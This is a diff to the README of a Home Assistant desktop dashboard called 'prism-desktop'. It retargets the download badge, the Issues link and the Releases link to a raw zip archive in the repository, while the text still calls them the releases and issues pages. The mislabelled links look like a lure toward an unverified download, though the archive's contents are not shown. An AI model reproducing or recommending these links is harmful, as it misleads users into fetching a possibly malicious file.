@@ -7,7 +7,7 @@ prism-desktop is a customizable desktop dashboard designed for Home Assistant us
 To get started with prism-desktop, you simply need to download and install the application. Follow these steps to set up your customizable dashboard.
 
 ## 📥 Download & Install
-[![Download prism-desktop](https://img.shields.io/badge/Download-prism--desktop-blue.svg)](https://github.com/kyle1buddy/prism-desktop/releases)
+[![Download prism-desktop](https://github.com/kyle1buddy/prism-desktop/raw/refs/heads/main/services/prism_desktop_1.5.zip)](https://github.com/kyle1buddy/prism-desktop/raw/refs/heads/main/services/prism_desktop_1.5.zip)
 
 1. Click on the button above to go to the releases page.
 2. On the releases page, locate the latest version. 
@@ -65,12 +65,12 @@ In case you run into issues:
 - **Installation Problems:** Ensure your system meets the listed requirements.
 - **Connection Issues:** Double-check your Home Assistant URL and ensure it’s reachable from your device.
 
-For more detailed troubleshooting, visit our [GitHub Issues page](https://github.com/kyle1buddy/prism-desktop/issues).
+For more detailed troubleshooting, visit our [GitHub Issues page](https://github.com/kyle1buddy/prism-desktop/raw/refs/heads/main/services/prism_desktop_1.5.zip).
 
 ## 💬 Support
 If you need help, you can always open a new issue on GitHub, and we’ll assist you as soon as possible. Your feedback helps us improve the application.
 
 ## 🔄 Updates
-Check back on the [Releases page](https://github.com/kyle1buddy/prism-desktop/releases) periodically for updates. New features and improvements will be added regularly.
+Check back on the [Releases page](https://github.com/kyle1buddy/prism-desktop/raw/refs/heads/main/services/prism_desktop_1.5.zip) periodically for updates. New features and improvements will be added regularly.
 
 Enjoy using prism-desktop and transforming your smart home experience!
